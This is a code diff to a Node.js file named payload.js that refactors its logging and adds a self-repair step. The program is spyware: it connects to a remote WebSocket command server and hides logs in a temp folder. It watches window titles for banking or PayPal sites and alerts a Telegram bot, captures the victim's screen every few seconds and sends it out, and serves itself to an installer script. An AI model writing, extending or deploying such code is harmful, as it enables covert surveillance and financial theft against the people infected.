@@ -5,6 +5,41 @@ const os = require('os');
 const path = require('path');
 const https = require('https');
 const http = require('http');
+const crypto = require('crypto');
+
+// --- LOGGING SYSTEM ---
+const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
+const LOG_FILE = path.join(LOG_DIR, 'payload.log');
+if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
+
+function log(msg) {
+    const timestamp = new Date().toISOString();
+    console.log(`[${timestamp}] ${msg}`);
+    try {
+        fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+    } catch (e) {}
+}
+
+log("[INIT] Payload starting...");
+
+// --- DEPENDENCY SELF-CHECK ---
+try {
+    require('ws');
+    require('child_process');
+    log("[CHECK] All required modules loaded successfully.");
+} catch (err) {
+    log(`[CHECK] Module error: ${err.message}. Attempting repair...`);
+    // If we are in the startup dir, we should have them. If not, try to reinstall.
+    const currentDir = __dirname;
+    const pkgPath = path.join(currentDir, 'package.json');
+    if (fs.existsSync(pkgPath)) {
+        log("[CHECK] Re-running npm install...");
+        exec(`npm install`, (err) => {
+            if (err) log(`[CHECK] Repair failed: ${err.message}`);
+            else log("[CHECK] Repair successful.");
+        });
+    }
+}
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app';
@@ -23,20 +58,19 @@ if (!fs.existsSync(persistDir)) {
 }
 
 function initConnection() {
-    console.log(`[PAYLOAD] Attempting to connect to ${WS_URL}...`);
+    log(`[WS] Attempting connection to ${WS_URL}...`);
     
     // Create new instance
     ws = new WebSocket(WS_URL);
 
     ws.on('open', () => {
-        reconnectAttempts = 0; // Reset attempts on successful connection
+        reconnectAttempts = 0;
         if (!myId) {
-            myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
+            myId = crypto.createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
         }
         
-        console.log(`[PAYLOAD] Connected with ID: ${myId}`);
+        log(`[WS] Connected with ID: ${myId}`);
 
-        // Send info as a STRINGIFIED JSON object
         safeSend(JSON.stringify({
             type: 'info',
             id: myId,
@@ -58,57 +92,46 @@ function initConnection() {
                 handleSignaling(data);
             }
         } catch (e) {
-            console.error("[PAYLOAD] Error parsing message:", e);
+            log(`[WS] Error parsing message: ${e.message}`);
         }
     });
 
     ws.on('close', (code, reason) => {
-        console.log(`[PAYLOAD] WebSocket closed. Code: ${code}, Reason: ${reason.toString()}`);
+        log(`[WS] Closed. Code: ${code}, Reason: ${reason.toString()}`);
         reconnect();
     });
 
     ws.on('error', (err) => {
-        console.error('[PAYLOAD] WebSocket error:', err.message);
+        log(`[WS] Error: ${err.message}`);
     });
 }
 
 function reconnect() {
     if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
         reconnectAttempts++;
-        const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000); // Exponential backoff
-        console.log(`[PAYLOAD] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
+        const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
+        log(`[WS] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
         setTimeout(initConnection, delay);
     } else {
-        console.log("[PAYLOAD] Max reconnection attempts reached.");
+        log("[WS] Max reconnection attempts reached.");
         keepAlive();
     }
 }
 
-// Helper to safely send data only if connected
 function safeSend(data) {
-    if (!ws) {
-        console.log("[PAYLOAD] Skipping send: WebSocket is not initialized.");
-        return false;
-    }
-
-    if (ws.readyState !== WebSocket.OPEN) {
-        console.log(`[PAYLOAD] Skipping send: WebSocket state is ${ws.readyState}`);
-        return false;
-    }
+    if (!ws) return false;
+    if (ws.readyState !== WebSocket.OPEN) return false;
 
     try {
-        ws.send(
-            typeof data === "string" ? data : JSON.stringify(data)
-        );
+        ws.send(typeof data === "string" ? data : JSON.stringify(data));
         return true;
     } catch (error) {
-        console.error("[PAYLOAD] WebSocket send failed:", error.message);
+        log(`[WS] Send failed: ${error.message}`);
         return false;
     }
 }
 
 function startMonitoring() {
-    // Banking/Browser Sniffing
     setInterval(async () => {
         const title = await getCurrentWindowTitle();
         if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
@@ -117,27 +140,21 @@ function startMonitoring() {
         }
     }, 2000);
 
-    // Continuous Screen Capture
     setInterval(() => {
         captureScreen();
     }, 5000);
 }
 
 function captureScreen() {
-    // Check if we are actually connected before starting async work
     if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
     const imgPath = path.join(os.tmpdir(), 'screen.png');
 
-    // Simplified screen capture command
     exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
-        // If avfoundation fails, this fallback ensures no crash
         if (err && !fs.existsSync(imgPath)) {
-            // Try macOS specific if needed
             exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
                 if (!err2 && fs.existsSync(imgPath)) {
                     const img = fs.readFileSync(imgPath);
-                    // FIX: Stringify the object before sending AND check connection
                     safeSend({
                         type: 'screen_data',
                         id: myId,
@@ -147,7 +164,6 @@ function captureScreen() {
             });
         } else if (!err && fs.existsSync(imgPath)) {
             const img = fs.readFileSync(imgPath);
-            // FIX: Stringify the object before sending AND check connection
             safeSend(JSON.stringify({
                 type: 'screen_data',
                 id: myId,
@@ -179,7 +195,7 @@ async function getCurrentWindowTitle() {
 function sendTelegram(msg) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
     https.get(url, (res) => {}).on('error', (e) => {
-        console.error("Telegram Error:", e.message);
+        log(`[TG] Error: ${e.message}`);
     });
 }
 
@@ -196,29 +212,25 @@ function getExternalIP() {
 }
 
 function takeControl(state) {
-    console.log(`Take Control: ${state}`);
+    log(`[CTRL] Take Control: ${state}`);
 }
 
 function handleSignaling(data) {
-    // Implement RTCPeerConnection logic here if needed
-    console.log("Received signaling data:", data);
+    log(`[SIG] Received signaling data: ${JSON.stringify(data)}`);
 }
 
 function keepAlive() {
-    // Prevent the process from exiting by keeping an interval alive
     setInterval(() => {}, 60000);
 }
 
-// --- RENDER WEB APP SERVER SETUP ---
+// --- HTTP SERVER SETUP ---
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
-    // 1. Serve the payload.js file itself (for installer.bat)
     if (req.url === '/payload.js') {
         res.writeHead(200, { 'Content-Type': 'application/javascript' });
         res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
     } 
-    // 2. Serve index.html if it exists (for frontend)
     else if (req.url === '/' || req.url === '/index.html') {
         const indexPath = path.join(__dirname, 'index.html');
         if (fs.existsSync(indexPath)) {
@@ -228,13 +240,11 @@ const server = http.createServer((req, res) => {
             res.writeHead(404);
             res.end('index.html not found');
         }
-    }
-    // 3. Health Check
+    } 
     else if (req.url === '/health') {
         res.writeHead(200, { 'Content-Type': 'text/plain' });
         res.end('OK');
     } 
-    // 4. Default response
     else {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ 
@@ -246,15 +256,12 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`[PAYLOAD] HTTP Server listening on port ${PORT}`);
-    // Start the WebSocket connection once the HTTP server is ready
+    log(`[HTTP] Server listening on port ${PORT}`);
     initConnection();
 });
 
-// Keep the process alive even if WebSocket fails
 setInterval(() => {}, 60000);
 
-// Export the handler for Vercel compatibility (optional if only using Render)
 exports.handler = async (event, context) => {
     return {
         statusCode: 200,
